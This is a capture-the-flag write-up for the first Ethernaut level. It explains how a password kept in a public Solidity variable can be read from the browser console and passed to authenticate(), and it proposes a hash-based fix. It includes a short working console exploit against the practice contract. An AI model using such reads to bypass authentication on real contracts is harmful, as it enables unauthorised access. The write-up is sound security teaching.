# 00 - Hello Ethernaut

## Goal

The goal of this level is to authenticate with the correct password and set `cleared` to `true`.

In simple words:

```text
Find the password
↓
Call authenticate(password)
↓
Set cleared = true
↓
Submit the level instance
```

## Contract Overview

The contract contains a password, some clue functions, and an authentication function.

```solidity
string public password;
uint8 public infoNum = 42;
string public theMethodName = "The method name is method7123949.";
bool private cleared = false;
```

The important function is:

```solidity
function authenticate(string memory passkey) public {
    if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
        cleared = true;
    }
}
```

This function compares the submitted `passkey` with the stored `password`.

If both values are equal, the contract sets:

```solidity
cleared = true;
```

The level is completed when `cleared` becomes `true`.

## Interface View

From the browser console, Ethernaut gives us a JavaScript object called:

```js
contract
```

This object is connected to the deployed challenge contract.

Because the variable `password` is public, Solidity automatically creates a getter function.

So this Solidity variable:

```solidity
string public password;
```

can be called from the console like this:

```js
await contract.password()
```

The same applies to other public variables:

```solidity
uint8 public infoNum = 42;
string public theMethodName = "The method name is method7123949.";
```

They can be called from the interface like this:

```js
await contract.infoNum()
await contract.theMethodName()
```

So from the frontend/interface point of view, the contract exposes functions such as:

```js
contract.password()
contract.infoNum()
contract.theMethodName()
contract.info()
contract.info1()
contract.info2("hello")
contract.info42()
contract.method7123949()
contract.authenticate(passkey)
contract.getCleared()
```

## Vulnerability

The password is stored as a `public` state variable:

```solidity
string public password;
```

In Solidity, when a variable is marked as `public`, the compiler automatically creates a getter function.

So this variable can be called from the browser console:

```js
await contract.password()
```

This means the password is directly readable from the contract interface.

The deeper issue is not only that the variable is `public`.

The real issue is:

```text
A secret is stored directly on-chain.
```

On a public blockchain, stored data should be considered public.

## Attack Path

The level gives several hints through public functions.

The player can call:

```js
await contract.info()
```

This returns a clue telling the player to call:

```js
await contract.info1()
```

Then:

```js
await contract.info2("hello")
```

Then:

```js
await contract.infoNum()
```

The value of `infoNum` is:

```text
42
```

So the player calls:

```js
await contract.info42()
```

Then the contract says that the next method name is stored in:

```js
await contract.theMethodName()
```

This reveals:

```text
method7123949
```

So the player calls:

```js
await contract.method7123949()
```

This function tells the player:

```text
If you know the password, submit it to authenticate().
```

However, the real weakness is that the password can be read directly:

```js
await contract.password()
```

Once the password is known, it can be submitted to `authenticate()`.

## Exploit

First, read the password:

```js
const password = await contract.password()
```

Then authenticate with that password:

```js
await contract.authenticate(password)
```

## Verification

Check if the level is cleared:

```js
await contract.getCleared()
```

Expected result:

```js
true
```

## Full Exploit

```js
const password = await contract.password()
await contract.authenticate(password)
await contract.getCleared()
```

Or in one line:

```js
await contract.authenticate(await contract.password())
```

Then submit the level instance in Ethernaut.

## Impact

The authentication mechanism can be bypassed because the secret password is exposed.

An attacker can:

```text
Read the password
↓
Submit it to authenticate()
↓
Set cleared = true
↓
Complete the level
```

The password is not protected because it is stored directly on-chain and exposed through a public getter function.

This makes the authentication mechanism ineffective.

## Proposed Solution: Store a Password Hash

The contract should not store the raw password directly on-chain.

The vulnerable version stores the password like this:

```solidity
string public password;
```

This is unsafe because anyone can read it with:

```js
await contract.password()
```

A better solution is to store only the hash of the password.

Instead of storing:

```text
password
```

the contract stores:

```text
hash(password)
```

## Fixed Contract Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance {
    bytes32 private passwordHash;
    bool private cleared = false;

    constructor(string memory _password) {
        passwordHash = keccak256(abi.encodePacked(_password));
    }

    function authenticate(string memory passkey) public {
        if (keccak256(abi.encodePacked(passkey)) == passwordHash) {
            cleared = true;
        }
    }

    function getCleared() public view returns (bool) {
        return cleared;
    }
}
```

## How the Hash Solution Works

In the original vulnerable contract, the raw password is stored:

```solidity
string public password;
```

In the fixed version, the raw password is not stored.

Instead, the contract stores:

```solidity
bytes32 private passwordHash;
```

During deployment, the constructor receives the password:

```solidity
constructor(string memory _password)
```

Then it hashes it:

```solidity
passwordHash = keccak256(abi.encodePacked(_password));
```

So the blockchain stores only the hash result.

When a user calls:

```solidity
authenticate(passkey)
```

the contract hashes the submitted `passkey`:

```solidity
keccak256(abi.encodePacked(passkey))
```

Then it compares this hash with the stored hash:

```solidity
keccak256(abi.encodePacked(passkey)) == passwordHash
```

If both hashes are equal, the submitted password is correct and the contract sets:

```solidity
cleared = true;
```

## Why This Is Better

The original contract exposes the password directly:

```solidity
string public password;
```

Anyone can call:

```js
await contract.password()
```

With the hash version, the raw password is not directly available through the contract interface.

The attacker can only see the hash, not the original password.

So the attack becomes harder.

## Important Limitation

This solution is better than storing the raw password, but it is not perfect.

If the password is weak, for example:

```text
hello
password123
ethernaut0
```

an attacker can guess common passwords, hash them, and compare the result with the stored hash.

So the password must be strong and hard to guess.

For critical smart contract access control, password-based authentication is usually not the best pattern.

Better approaches include:

```text
wallet-based access control
signatures
roles and permissions
off-chain verification
commit-reveal schemes
```

## Lesson Learned

Never store secrets directly in a smart contract.

On a public blockchain, data can be inspected.

Important distinction:

```text
public
→ Solidity creates an easy getter function

private
→ no automatic getter function
→ but the data is still stored on-chain
→ advanced users can inspect storage
```

So:

```text
private does not mean secret
```

The main security lesson is:

```text
Anything stored on-chain should be considered public.
```
